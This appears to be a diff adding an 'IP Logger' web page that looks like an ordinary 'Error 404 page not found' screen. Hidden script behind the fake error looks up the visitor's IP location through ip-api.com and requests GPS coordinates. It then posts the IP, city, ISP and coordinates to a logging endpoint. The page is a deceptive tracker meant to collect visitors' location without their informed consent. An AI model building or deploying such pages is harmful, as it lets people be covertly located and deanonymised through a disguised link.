@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>IP Logger</title>
+</head>
+<body>
+<div style="display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column;">
+  <h2>Error 404</h2>
+  <h2>page not found</h2>
+</div>
+
+
+  <script>
+    // First get location from IP
+    fetch("http://ip-api.com/json")
+      .then(res => res.json())
+      .then(ipData => {
+        // Then try to get exact GPS location (with permission)
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            // If user allows location
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            sendData(ipData, latitude, longitude);
+          },
+          (error) => {
+            // If user denies location
+            console.warn("GPS permission denied:", error.message);
+            sendData(ipData, null, null);
+          }
+        );
+      });
+
+    function sendData(ipData, lat, lon) {
+      fetch("http://localhost:5000/log-ip", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          ip: ipData.query,
+          country: ipData.country,
+          city: ipData.city,
+          isp: ipData.isp,
+          latitude: lat,
+          longitude: lon
+        })
+      });
+    }
+  </script>
+</body>
+</html>
